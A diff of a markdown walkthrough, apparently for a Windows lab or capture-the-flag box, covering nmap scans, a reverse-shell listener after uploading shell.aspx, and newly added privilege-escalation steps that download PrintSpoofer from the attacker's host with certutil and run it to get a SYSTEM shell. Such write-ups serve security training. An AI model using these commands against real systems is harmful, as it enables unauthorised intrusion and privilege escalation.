@@ -11,13 +11,12 @@
 <pre><code><strong>nmap -A 10.10.145.102
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (7).png" alt=""><figcaption></figcaption></figure>
 
 ### Scan all ports
 
-```
-nmap -p- 10.10.145.102
-```
+<pre><code><strong>nmap -p- 10.10.145.102
+</strong></code></pre>
 
 ### 135/TCP - msrpc
 
@@ -106,19 +105,20 @@ put shell.aspx
 
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali #2**
 
-```
-nc -lvnp 1337
-```
+<pre><code><strong>rlwrap nc -lvnp 1337
+</strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
 ## Privilege Escalation
+
+SeImpersonatePrivilege&#x20;
 
 **Victim**
 
@@ -127,5 +127,27 @@ systeminfo
 whoami /priv
 ```
 
-Kali
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+git clone https://github.com/dievus/printspoofer
+cd printspoofer/
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim**
+
+```
+cd C:\Windows\Temp
+certutil -urlcache -f http://10.10.163.87:81/PrintSpoofer.exe PrintSpoofer.exe
+PrintSpoofer.exe -i -c whoami
+PrintSpoofer.exe -i -c powershell.exe
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
